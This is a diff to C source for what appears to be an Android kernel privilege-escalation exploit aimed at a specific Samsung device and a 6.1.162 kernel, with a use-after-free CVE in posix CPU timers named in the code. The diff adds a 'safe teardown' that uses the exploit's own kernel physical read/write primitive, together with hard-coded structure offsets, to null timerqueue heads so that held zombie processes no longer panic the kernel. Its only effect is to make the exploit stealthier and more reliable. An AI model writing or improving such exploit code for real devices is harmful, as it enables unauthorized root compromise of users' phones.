@@ -257,6 +257,62 @@ static unsigned long long g_slide;
 static int g_slide_set;
 static int g_held;
 static unsigned long long g_pipe_addr;
+
+/* === CVE-2026-98260 safe teardown =======================================
+ * After KSU is up (or whenever this holder is about to sleep in park_forever,
+ * the killable state a soft-reboot / SIGKILL can reach), detach every held
+ * victim's stale posix-cpu-timer node so the kernel no longer UAFs on reap.
+ *
+ * Why null the timerqueue HEAD and never the node itself:
+ *   park_forever's own comment (line ~1224) notes the stale node sits inside
+ *   a page the allocator already handed back out -- so writing V+0x78 is
+ *   unsafe.  The victim's signal_struct (and its embedded posix_cputimers)
+ *   stays allocated until the zombie is *actually* reaped, so nulling the
+ *   timerqueue_head for every CPU-clock base makes cleanup_posix_cputimers()
+ *   a no-op when init later reaps the zombie.  A dead parked process can then
+ *   no longer panic the kernel.
+ *
+ * 6.1.162 layout (verified via the SM-S928B EZIF BTF blob):
+ *   signal_struct.posix_cputimers          @ 0x120   (struct posix_cputimers)
+ *   posix_cputimers.bases[CPUCLOCK_MAX]    each stride 0x18
+ *     posix_cputimer_base.nextevt           @ +0x00   (u64)
+ *     posix_cputimer_base.tqhead            @ +0x08   (struct timerqueue_head)
+ *       timerqueue_head.rb_root.rb_node      @ +0x00   (the rb tree root ptr)
+ *   => timerqueue root for base i == sig + 0x120 + i*0x18 + 0x08
+ * There are 3 bases (PROF/VIRT/SCHED); we null all 3, because the
+ * signal_struct is private to the victim's thread group so this only ever
+ * detaches the victim's own timers.  Offsets MUST match the running build. */
+static uint64_t g_held_v[64];
+static int g_held_n;
+static int g_safe_rfd = -1;                 /* pipe READ end for physrw read */
+static int g_safe_wfd = -1;                 /* pipe WRITE end for physrw write */
+static unsigned char *g_safe_page = NULL;   /* scratch page for physrw */
+static int g_safe_unlink_busy;              /* re-entrancy guard */
+static void hold_victim(unsigned long long V);
+static void safe_unlink_held(void);
+#ifndef OFF_KITIMER_IT_SIGNAL
+/* k_itimer.it_signal byte offset. CALIBRATED for SM-S928B EZIF (6.1.162):
+ * BTF: k_itimer.it_signal @ 0x60. */
+#define OFF_KITIMER_IT_SIGNAL 0x60ULL
+#endif
+#ifndef OFF_SIGNAL_POSIX_CPUTIMERS
+/* signal_struct.posix_cputimers byte offset. CALIBRATED for SM-S928B EZIF
+ * (6.1.162): BTF: signal_struct.posix_cputimers @ 0x120. */
+#define OFF_SIGNAL_POSIX_CPUTIMERS 0x120ULL
+#endif
+#ifndef POSIX_CPUTIMER_BASE_STRIDE
+/* sizeof(struct posix_cputimer_base) = 0x18 on 6.1.162 (nextevt:8 + tqhead:16). */
+#define POSIX_CPUTIMER_BASE_STRIDE 0x18ULL
+#endif
+#ifndef POSIX_CPUTIMER_BASE_TQHEAD
+/* offset of `tqhead` (struct timerqueue_head) within posix_cputimer_base. */
+#define POSIX_CPUTIMER_BASE_TQHEAD 0x8ULL
+#endif
+#ifndef POSIX_CPUTIMER_NBASES
+/* CPU-clock timerqueue bases (CPUCLOCK_PROF/VIRT/SCHED). Null all of them so
+ * the node is detached regardless of which clock the exploit armed. */
+#define POSIX_CPUTIMER_NBASES 3
+#endif
 static unsigned long long g_pipe_bufs;
 static unsigned long long g_pipe_target_page;
 static unsigned int g_pipe_target_off;
@@ -1191,6 +1247,15 @@ static void park_forever(const char *why)
 {
     logf("[!] %s -- parking without reap (zombie held)\n", why);
     fflush(stdout);
+    /*
+     * CVE-2026-98260: detach every held victim's stale timerqueue node
+     * BEFORE sleeping.  park_forever is the killable state a soft-reboot or
+     * SIGKILL can reach (it reparents our held zombies to init, which then
+     * reaps them -> release_task -> cleanup_timerqueue on a reclaimed page =
+     * the original panic).  safe_unlink_held() nulls each victim's
+     * signal_struct->posix_cputimers timerqueue head so that reap is safe.
+     */
+    safe_unlink_held();
     /*
      * Stop the vm helpers before sleeping: the lockers spin mprotect loops
      * pinned to CPUs 1/3 and the killer spins tgkill on CPU 2, and a parked
@@ -2285,13 +2350,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
             logf("[-] plant%d no zombie (code=%d status=%d, etid=%d "
                  "still alive); killed, zombie held, retryable\n",
                  tag, si.si_code, si.si_status, etid);
-            g_held++;
+            hold_victim(V);
             res->retry = 1;
             return;
         }
         logf("[-] plant%d no zombie (code=%d status=%d); holding child\n",
              tag, si.si_code, si.si_status);
-        g_held++;
+        hold_victim(V);
         return;
     }
     logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
@@ -2318,7 +2383,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         }
         logf("[-] plant%d reap code=%d status=%d not SIGKILL; holding zombie\n",
              tag, si.si_code, si.si_status);
-        g_held++;
+        hold_victim(V);
         return;
     }
     /*
@@ -2393,7 +2458,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
          * unreaped) and let stage_write pick a new victim.
          */
         logf("[-] plant%d burst missed; holding zombie; retryable\n", tag);
-        g_held++;
+        hold_victim(V);
         /* No erase will use this payload (the zombie is held unreaped), so
          * reclaim the spray memory now. */
         drain_spray(mode == 2);
@@ -2991,6 +3056,104 @@ static int user_pipe_write(int fd, unsigned char *page,
     return (int)n;
 }
 
+/* Record a held victim's k_itimer VA (callers previously used bare
+ * g_held++; this additionally lets safe_unlink_held() find the node). */
+static void hold_victim(unsigned long long V)
+{
+    g_held++;
+    if (g_held_n < (int)(sizeof(g_held_v) / sizeof(g_held_v[0])))
+        g_held_v[g_held_n++] = V;
+}
+
+/* Detach every held victim's stale posix-cpu-timer node by nulling its
+ * signal_struct->posix_cputimers.bases[i].tqhead (the timerqueue_head rb root)
+ * for all 3 CPU-clock bases.
+ *
+ * This is the CVE-2026-98260 "safe unlink": the stale node lives in a page
+ * the allocator already reclaimed (see park_forever), so we never touch it.
+ * We only write to the victim's signal_struct, which stays allocated until
+ * the zombie is really reaped -- so a later reparent-to-init + release_task()
+ * runs cleanup_posix_cputimers() over empty timerqueues and cannot UAF.
+ *
+ * Uses the exploit's own physrw (user_pipe_read / user_pipe_write).  If the
+ * offsets are uncalibrated (OFF_SIGNAL_POSIX_CPUTIMERS == 0) or the reads
+ * look wrong we skip WITHOUT writing, so a miscalibration can never corrupt
+ * kernel memory. */
+static void safe_unlink_held(void)
+{
+    /* Guard against re-entrancy: the physrw primitives below call run_plant,
+     * whose own failure path calls park_forever() -> this function again. */
+    if (g_safe_unlink_busy)
+        return;
+    g_safe_unlink_busy = 1;
+    if (g_held_n == 0)
+    {
+        g_safe_unlink_busy = 0;
+        return;
+    }
+    if (g_safe_rfd < 0 || g_safe_wfd < 0 || !g_safe_page)
+    {
+        logf("[!] safe_unlink: physrw not ready (rfd=%d wfd=%d page=%p); skipping "
+             "-- held-zombie reap still dangerous\n",
+             g_safe_rfd, g_safe_wfd, (void *)g_safe_page);
+        return;
+    }
+    if (OFF_SIGNAL_POSIX_CPUTIMERS == 0)
+    {
+        logf("[!] safe_unlink: OFF_SIGNAL_POSIX_CPUTIMERS not "
+             "calibrated; skipping (derive via BTF: signal_struct.posix_cputimers)\n");
+        return;
+    }
+    for (int i = 0; i < g_held_n; i++)
+    {
+        uint64_t V = g_held_v[i];
+        uint64_t sig = 0;
+
+        if (user_pipe_read(g_safe_rfd, g_safe_page, V + OFF_KITIMER_IT_SIGNAL,
+                           &sig, 8) != 8)
+        {
+            logf("[!] safe_unlink: read it_signal failed V=%#llx\n", V);
+            continue;
+        }
+        if (sig < LINEAR_MAP_BASE || sig >= 0xffffffc000000000ULL)
+        {
+            logf("[!] safe_unlink: bad it_signal %#llx V=%#llx "
+                 "(OFF_KITIMER_IT_SIGNAL wrong?)\n", sig, V);
+            continue;
+        }
+        /* For each CPU-clock base, null the whole timerqueue_head (16 bytes:
+         * rb_root.rb_node + rb_root_cached.rb_leftmost) so the reaper's
+         * cleanup_posix_cputimers() walk over an empty tree cannot UAF. */
+        for (int b = 0; b < POSIX_CPUTIMER_NBASES; b++)
+        {
+            uint64_t tq = sig + OFF_SIGNAL_POSIX_CPUTIMERS
+                              + (uint64_t)b * POSIX_CPUTIMER_BASE_STRIDE
+                              + POSIX_CPUTIMER_BASE_TQHEAD;
+            uint64_t root_node = 0;
+            if (user_pipe_read(g_safe_rfd, g_safe_page, tq, &root_node, 8) != 8)
+            {
+                logf("[!] safe_unlink: read tqhead[%d] failed V=%#llx\n", b, V);
+                continue;
+            }
+            /* Accept an empty tree (root==0) or a plausible kernel VA; a
+             * garbage non-zero value means the offset is wrong -> skip. */
+            if (root_node != 0 &&
+                (root_node < LINEAR_MAP_BASE ||
+                 root_node >= 0xffffffc000000000ULL))
+            {
+                logf("[!] safe_unlink: bad tqhead[%d] root %#llx V=%#llx "
+                     "tq=%#llx (offset wrong?)\n", b, root_node, V, tq);
+                continue;
+            }
+            uint64_t z[2] = {0, 0};
+            int n = user_pipe_write(g_safe_wfd, g_safe_page, tq, &z, 16);
+            logf("[+] safe-unlink: V=%#llx base[%d] tqhead=%#llx root=%#llx "
+                 "-> NULL (%d bytes)\n", V, b, tq, root_node, n);
+        }
+    }
+    g_safe_unlink_busy = 0;
+}
+
 int main(int argc, char **argv)
 {
     unsigned char *raw;
@@ -3203,6 +3366,13 @@ int main(int argc, char **argv)
             *mark = 0x1122334455667788ULL;
         if (pipe(pf) != 0)
             park_forever("pipe() failed");
+        /* CVE-2026-98260 safe-teardown: remember the physrw pipe + scratch
+         * page so safe_unlink_held() (called from park_forever) can null held
+         * victims' timerqueue heads. */
+        g_safe_rfd = pf[0];
+        g_safe_wfd = pf[1];
+        if (mark != MAP_FAILED)
+            g_safe_page = (unsigned char *)mark;
         (void)!write(pf[1], "A", 1);
         (void)!read(pf[0], &ch, 1);
         {
